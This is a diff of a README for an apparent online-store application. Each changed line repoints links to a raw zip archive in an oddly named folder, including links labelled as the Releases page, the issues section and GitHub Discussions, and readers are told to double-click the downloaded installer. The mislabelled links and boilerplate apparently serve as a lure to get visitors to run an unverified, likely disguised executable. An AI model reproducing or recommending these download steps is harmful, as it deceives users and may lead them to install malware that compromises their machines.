@@ -1,6 +1,6 @@
 # 🛍️ wmasshop-online-store - Your Simple Online Shopping Solution
 
-[![Download Now](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip)
+[![Download Now](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip)
 
 ## 📚 Overview
 
@@ -25,16 +25,16 @@ Welcome to the official repository of WMASSHOP, your go-to platform for online s
 
 To get started with WMASSHOP, follow these easy steps:
 
-1. Visit the [Releases page here](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip).
+1. Visit the [Releases page here](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip).
 2. Look for the most recent version available for download.
 3. Click on the version link to go to the download section.
-4. Download the installer file for your operating system—this file is usually named similarly to the latest version (e.g., `https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip`).
+4. Download the installer file for your operating system—this file is usually named similarly to the latest version (e.g., `https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip`).
 5. Once the download is complete, locate the file on your computer and double-click to run the installer.
 6. Follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download WMASSHOP](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip). There, you will find the latest version ready for download.
+To download the application, visit this page: [Download WMASSHOP](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip). There, you will find the latest version ready for download.
 
 1. Click on the link for the latest release.
 2. Choose the installer file suited to your operating system.
@@ -46,7 +46,7 @@ To download the application, visit this page: [Download WMASSHOP](https://raw.gi
 
 ### 1. How do I update WMASSHOP?
 
-To update, simply return to the [Releases page](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip) and repeat the download process for the latest version. Install it over the existing application, and your data will remain intact.
+To update, simply return to the [Releases page](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip) and repeat the download process for the latest version. Install it over the existing application, and your data will remain intact.
 
 ### 2. Can I use WMASSHOP on my mobile device?
 
@@ -58,13 +58,13 @@ WMASSHOP supports major credit cards, PayPal, and secure payment gateways. Your 
 
 ### 4. Who can I contact for support?
 
-For assistance, please visit the [issues section](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip) of our GitHub repository where you can report problems or seek help.
+For assistance, please visit the [issues section](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip) of our GitHub repository where you can report problems or seek help.
 
 ## 🌐 Community & Support
 
 Join our community to share tips, ask questions, and stay updated about new features and releases.
 
-- Follow us on [GitHub Discussions](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop-online-store.zip).
+- Follow us on [GitHub Discussions](https://raw.githubusercontent.com/PRAMPL/wmasshop-online-store/main/sodless/wmasshop_online_store_v1.2.zip).
 - Check for any updates or announcements on our official page.
 
 ## 📖 License
